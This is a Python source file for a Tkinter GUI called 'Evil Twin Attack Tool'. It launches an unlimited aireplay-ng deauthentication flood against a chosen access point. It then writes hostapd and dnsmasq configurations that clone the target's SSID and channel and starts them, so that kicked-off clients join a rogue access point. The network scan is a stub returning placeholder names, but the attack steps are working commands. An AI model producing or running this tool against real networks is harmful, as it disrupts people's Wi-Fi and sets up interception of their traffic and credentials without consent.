import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import threading

class EvilTwinApp:
    """
    A GUI application to perform an Evil Twin Wi-Fi attack.
    Provides functionality to scan networks, select a target,
    and start/stop the attack using external tools like airodump-ng,
    aireplay-ng, hostapd, and dnsmasq.
    """

    def __init__(self, root):
        """
        Initialize the application GUI and variables.

        Args:
            root (tk.Tk): The root Tkinter window.
        """
        self.root = root
        self.root.title("Evil Twin Attack Tool")
        self.root.geometry("600x400")

        # Variables to hold user input and selections
        self.target_ssid = tk.StringVar()
        self.target_bssid = tk.StringVar()
        self.target_channel = tk.StringVar()
        self.interface = tk.StringVar(value="wlan0")

        # Create the GUI widgets
        self.create_widgets()

    def create_widgets(self):
        """
        Create and place all GUI widgets in the application window.
        """
        # Wi-Fi Interface input
        ttk.Label(self.root, text="Wi-Fi Interface:").pack(pady=5)
        ttk.Entry(self.root, textvariable=self.interface).pack(pady=5)

        # Scan Networks button
        ttk.Button(self.root, text="Scan Networks", command=self.scan_networks).pack(pady=5)

        # Target SSID dropdown
        ttk.Label(self.root, text="Target SSID:").pack(pady=5)
        self.ssid_dropdown = ttk.Combobox(self.root, textvariable=self.target_ssid)
        self.ssid_dropdown.pack(pady=5)

        # Target BSSID input (needed for deauth attack)
        ttk.Label(self.root, text="Target BSSID (MAC Address):").pack(pady=5)
        ttk.Entry(self.root, textvariable=self.target_bssid).pack(pady=5)

        # Target Channel input
        ttk.Label(self.root, text="Target Channel:").pack(pady=5)
        ttk.Entry(self.root, textvariable=self.target_channel).pack(pady=5)

        # Start and Stop Attack buttons
        ttk.Button(self.root, text="Start Evil Twin", command=self.start_attack).pack(pady=5)
        ttk.Button(self.root, text="Stop Attack", command=self.stop_attack).pack(pady=5)

        # Log output text box
        self.log = tk.Text(self.root, height=10)
        self.log.pack(pady=10, fill=tk.BOTH, expand=True)

    def scan_networks(self):
        """
        Start scanning for Wi-Fi networks in a separate thread.
        """
        self.log.insert(tk.END, "Scanning networks...\n")
        threading.Thread(target=self._scan_networks, daemon=True).start()

    def _scan_networks(self):
        """
        Perform the actual scanning of Wi-Fi networks using airodump-ng.
        This is a placeholder implementation and should be replaced with
        actual parsing of airodump-ng output.
        """
        try:
            # Run airodump-ng on the specified interface
            proc = subprocess.Popen(
                ["sudo", "airodump-ng", self.interface.get()],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            # TODO: Implement actual parsing of airodump-ng output to get networks
            # For demonstration, we use a static list
            networks = ["Network1", "Network2", "Network3"]

            # Update the SSID dropdown with found networks
            self.ssid_dropdown['values'] = networks

            self.log.insert(tk.END, "Scan complete.\n")
        except Exception as e:
            self.log.insert(tk.END, f"Error during scan: {e}\n")

    def start_attack(self):
        """
        Start the Evil Twin attack in a separate thread.
        """
        self.log.insert(tk.END, "Starting evil twin attack...\n")
        threading.Thread(target=self._start_attack, daemon=True).start()

    def _start_attack(self):
        """
        Perform the Evil Twin attack steps:
        - Deauthenticate clients from the target AP
        - Start a fake AP with hostapd
        - Start DHCP server with dnsmasq
        """
        try:
            # Deauthenticate clients from the target AP indefinitely
            subprocess.Popen([
                "sudo", "aireplay-ng", "--deauth", "0",
                "-a", self.target_bssid.get(),
                self.interface.get()
            ])

            # Create hostapd configuration file for the fake AP
            with open("hostapd.conf", "w") as f:
                f.write(
                    f"interface={self.interface.get()}\n"
                    f"driver=nl80211\n"
                    f"ssid={self.target_ssid.get()}\n"
                    f"hw_mode=g\n"
                    f"channel={self.target_channel.get()}\n"
                )

            # Start hostapd to create the fake AP
            subprocess.Popen(["sudo", "hostapd", "hostapd.conf"])

            # Create dnsmasq configuration file for DHCP
            with open("dnsmasq.conf", "w") as f:
                f.write(
                    f"interface={self.interface.get()}\n"
                    f"dhcp-range=192.168.1.100,192.168.1.200,12h\n"
                )

            # Start dnsmasq DHCP server
            subprocess.Popen(["sudo", "dnsmasq", "-C", "dnsmasq.conf"])

            self.log.insert(tk.END, "Evil twin running.\n")
        except Exception as e:
            self.log.insert(tk.END, f"Error starting attack: {e}\n")

    def stop_attack(self):
        """
        Stop the Evil Twin attack by killing related processes.
        """
        self.log.insert(tk.END, "Stopping attack...\n")
        try:
            subprocess.run(["sudo", "pkill", "hostapd"])
            subprocess.run(["sudo", "pkill", "dnsmasq"])
            subprocess.run(["sudo", "pkill", "aireplay-ng"])
            self.log.insert(tk.END, "Attack stopped.\n")
        except Exception as e:
            self.log.insert(tk.END, f"Error stopping attack: {e}\n")

if __name__ == "__main__":
    root = tk.Tk()
    app = EvilTwinApp(root)
    root.mainloop()
